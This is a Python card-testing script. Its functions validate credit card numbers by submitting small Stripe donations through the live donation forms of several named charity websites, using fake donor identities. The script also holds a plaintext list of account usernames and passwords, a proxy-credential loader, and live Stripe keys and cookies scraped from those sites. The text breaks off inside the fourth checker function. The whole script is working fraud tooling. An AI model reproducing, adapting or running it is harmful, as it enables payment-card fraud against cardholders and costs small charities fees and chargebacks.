import random
import string
import requests
from user_agent import generate_user_agent
import json
import re

# ============================= Proxy
def get_random_proxy(filename="proxy2.txt"):
    # proxy.txt
    with open(filename, "r", encoding="utf-8") as f:
        proxy = f.read().strip()

    ip, port, username, password = proxy.split(':')
    proxy_auth = f"http://{username}:{password}@{ip}:{port}"
    print(f"Using BrightData proxy: {proxy_auth}")
    return {"http": proxy_auth, "https": proxy_auth}
    
#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
import itertools

userpass_list = [
    "zone215@outlook.com|dkxjdj8hdbdb",
    "Zaroj|dkxjdj8hdbdb",
    "anni|dkxjdj8hdbdb",
    "jobi|dkxjdj8hdbdb",
    "xiaoAn|dkxjdj8hdbdb",
    "akumi|dkxjdj8hdbdb",
    "fang|dkxjdj8hdbdb",
    "zikosa|dkxjdj8hdbdb",
]

cyclic_accounts = itertools.cycle(userpass_list)

def get_next_credentials():
    creds = next(cyclic_accounts)
    username, password = creds.split('|')
    # print(f"Using Account: {username} and {password}")
    return username, password

#===========================================
# --- Main CC Check Function ---
def go0(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get(
            'https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G0 ID Response: {form_id}")
        print(f"G0 ID Response: {donation_nonce}")
        print(f"G0 ID Response: {campaign_id}")
        print(f"G0 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fflyingislandspocketpoets.com.au&time_on_page=18857&client_attribution_metadata[client_session_id]=db59f604-f124-4073-a15e-ce97a8940cb3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PwdsiB5eoqvSHOqyyHi6L4FRsmjdW4ItwjqokSEb553bHcI740aS58rHySVqzFUodW0yJ3Dt7XbvlnahfqRaq2Y000C03lovP'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G0 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'pmpro_visit': '1',
    'charitable_session': 'd021b409b9e3533e2350a25b9065b586||86400||82800',
    '_ga': 'GA1.1.340278551.1766037884',
    '_ga_JN189FD1FZ': 'GS2.1.s1766037883$o1$g1$t1766037889$j54$l0$h0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-18%2005%3A34%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2F',
    'sbjs_first_add': 'fd%3D2025-12-18%2005%3A34%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fflyingislandspocketpoets.com.au%2Fcampaigns%2Fflying-islands-poetry-community-gift-fund%2Fdonate%2F',
    '__hstc': '149861929.74912fb5b00ffcd5de31f7116d2d5c55.1766037899096.1766037899096.1766037899096.1',
    'hubspotutk': '74912fb5b00ffcd5de31f7116d2d5c55',
    '__hssrc': '1',
    '__hssc': '149861929.1.1766037899098',
    '__stripe_mid': '47d1feea-5799-4e3a-a1b2-921b4859ff086afeff',
    '__stripe_sid': 'f2a61ab8-3b3f-40b6-a495-2ec36d7efe05bc6d3b',
        }
        headers = {
    'authority': 'flyingislandspocketpoets.com.au',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://flyingislandspocketpoets.com.au',
    'pragma': 'no-cache',
    'referer': 'https://flyingislandspocketpoets.com.au/campaigns/flying-islands-poetry-community-gift-fund/donate/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/campaigns/flying-islands-poetry-community-gift-fund/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Flying Islands Poetry Community Inc Tax Deductible Gift Fund',
    'ID': f'{donation_id}',
    'donation_amount': 'custom',
    'custom_donation_amount': '2.00',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'gateway': 'stripe',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://flyingislandspocketpoets.com.au/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51PwdsiB5eoqvSHOqyyHi6L4FRsmjdW4ItwjqokSEb553bHcI740aS58rHySVqzFUodW0yJ3Dt7XbvlnahfqRaq2Y000C03lovP',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}")
        
        
#============================================
# --- Main CC Check Function ---
def go1(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        
        response = requests.get('https://hilosailing.org/donate/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G1 ID Response: {form_id}")
        print(f"G1 ID Response: {donation_nonce}")
        print(f"G1 ID Response: {campaign_id}")
        print(f"G1 ID Response: {donation_id}")
        	
        #2
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        data = f'type=card&billing_details[name]=Han+Maw&billing_details[email]={email}&billing_details[address][city]=Racie&billing_details[address][country]=AU&billing_details[address][line1]=24+George+Street&billing_details[address][postal_code]=2000&billing_details[address][state]=New+South+Walet&billing_details[phone]=%2B61290123456&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fhilosailing.org&time_on_page=33155&client_attribution_metadata[client_session_id]=708f32a5-a9d4-4916-a50a-3e1a1754c059&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51ON1uXBfuAdQ8FlJOfl7hiPy65S9zGjDTAtgRl4LGof7XeUUlIwgwr8CqCx3ATxiTM9f4jcYfoeepYeVF7if8no800V2EvdSnT'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G1 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
    'pmpro_visit': '1',
    'charitable_session': 'e612b40e768f885b1e25d5a120def5b6||86400||82800',
    '__stripe_mid': 'de3a8236-2406-41f1-8ac1-deec1ca17a69e3d243',
    '__stripe_sid': 'c064e056-6e5a-4a8f-a268-5cecea19ef6c140bd4',
    'holler-page-views': '1',
        }
        headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,my;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://hilosailing.org',
    'Pragma': 'no-cache',
    'Referer': 'https://hilosailing.org/donate/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'user-agent': user,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
        }
        data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': f'{campaign_id}',
    'description': 'Donation Page',
    'ID': f'{donation_id}',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '5.00',
    'recurring_donation': 'once',
    'first_name': 'Tiana',
    'last_name': 'Jakubowski',
    'email': email,
    'address': '24 George Street',
    'address_2': '',
    'city': 'Racie',
    'state': 'New South Walet',
    'postcode': '2000',
    'country': 'AU',
    'phone': '+61290123456',
    'stripe_payment_method': f'{pm}',
    'cover_fees': '1',
    'action': 'make_donation',
    'form_action': 'make_donation',
        }
        response = requests.post(
    'https://hilosailing.org/wp-admin/admin-ajax.php',
    cookies=cookies,
    headers=headers,
    data=data,#, proxies=proxy, timeout=30)    
        )
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51ON1uXBfuAdQ8FlJOfl7hiPy65S9zGjDTAtgRl4LGof7XeUUlIwgwr8CqCx3ATxiTM9f4jcYfoeepYeVF7if8no800V2EvdSnT',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 


#============================================
# --- Main CC Check Function ---
def go2(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        
        response = requests.get('https://boilerhousespaces.com/donate-google-place-pantry/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G2 ID Response: {form_id}")
        print(f"G2 ID Response: {donation_nonce}")
        print(f"G2 ID Response: {campaign_id}")
        print(f"G2 ID Response: {donation_id}")
        	
        #2
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }
        
        data = f'type=card&billing_details[name]=Gen+Paypal&billing_details[email]={email}&billing_details[address][country]=GB&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&referrer=https%3A%2F%2Fboilerhousespaces.com&time_on_page=32928&client_attribution_metadata[client_session_id]=6c3618b7-b11c-4a72-9c9d-84bd51423c46&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        res_json = response.json()
        pm = res_json.get('id')
        print(f"G2 ID Response: {pm}")
        if not id:
            print("Failed to get payment method.")
            return
                
        #3
        cookies = {
            'cookieyes-consent': 'consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
            'charitable_session': '8e6b4a1f23b55af6487d6d386fce14c6||86400||82800',
            '__stripe_mid': '82c6a1e8-ca5c-4926-ab52-285bc5625904114010',
            '__stripe_sid': '9afd8713-b367-43e0-9493-9dfbb6dc2d1818928f',
        }
        
        headers = {
            'authority': 'boilerhousespaces.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'cookieyes-consent=consentid:QkMzRTVzc2w3eWJPM3ptTXBUY1AwRUdyaTVlenJtTUg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; charitable_session=8e6b4a1f23b55af6487d6d386fce14c6||86400||82800; __stripe_mid=82c6a1e8-ca5c-4926-ab52-285bc5625904114010; __stripe_sid=9afd8713-b367-43e0-9493-9dfbb6dc2d1818928f',
            'origin': 'https://boilerhousespaces.com',
            'referer': 'https://boilerhousespaces.com/donate-google-place-pantry/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'charitable_form_id': f'{form_id}',
            f'{form_id}': '',
            '_charitable_donation_nonce': f'{donation_nonce}',
            '_wp_http_referer': '/donate-google-place-pantry/',
            'campaign_id': f'{campaign_id}',
            'description': 'The Good Place Pantry',
            'ID': f'{donation_id}',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Gen',
            'last_name': 'Paypal',
            'email': email,
            'address': '',
            'address_2': '',
            'city': '',
            'state': '',
            'postcode': '',
            'country': 'GB',
            'phone': '',
            'stripe_payment_method': f'{pm}',
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response = requests.post('https://boilerhousespaces.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)    
        if "secret" in response.text:
            print("✅ req3 required. Continue with next step...")
            response_str = response.text
            response = json.loads(response_str)
            secret = response.get("secret")
            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
            match = re.match(pattern, secret)
            if match:
            	full_secret = secret
            	prefix = match.group(1)
            	print("Full secret:", full_secret)
            	print("Prefix:", prefix)
            else:
            	print("No match found")
            	
            #4
            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
            }
            data = {
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_51SaDgw8aGJtOt5jNqsQM6KsKAwQsPBrnifOUyFGYwAxtEbmQtkGzTqsZ1rvzL7yRCSCSPUJ6XUIwMknD0hiRzMi8005LECx6z1',
    'client_secret': full_secret,
            }
            response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{prefix}/confirm',
    headers=headers,
    data=data,
            )                        
            # message
            result2 = response.text                      	
            return result2 #stop
            	
        else:
            print("❌ Payment no need Rq4. Stopping here.")
            result2 = response.text
            return result2  #stop
            
    except Exception as e:
        print(f"Error occurred: {e}") 
                                    
#============================================
# --- Main CC Check Function ---
def go3(cc_input: str) -> str:
    try:
        n, mm, yy, cvc = cc_input.strip().split("|")

        if int(mm) < 10 and not mm.startswith("0"):
            mm = f"0{mm}"
        if not yy.startswith("20"):
            yy = f"20{yy}"

        user = generate_user_agent()
        r = requests.Session()
        r.verify = False

        first_name, last_name = generate_full_name()
        kaddress, city, country, postcode, phone = generate_address()
        email = generate_email()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

#        proxy = get_random_proxy()
#        print(f"Using proxy: {proxy['http']}")  
      
        #1
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
        }
        response = requests.get('https://moffittlegacyfoundation.org/give/', headers=headers)
        form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
        donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
        campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
        donation_id = re.search(r'name="ID" value="(.*?)"', response.text).group(1)
        print(f"G3 ID Response: {form_id}")
        print(f"G3 ID Response: {donation_nonce}")
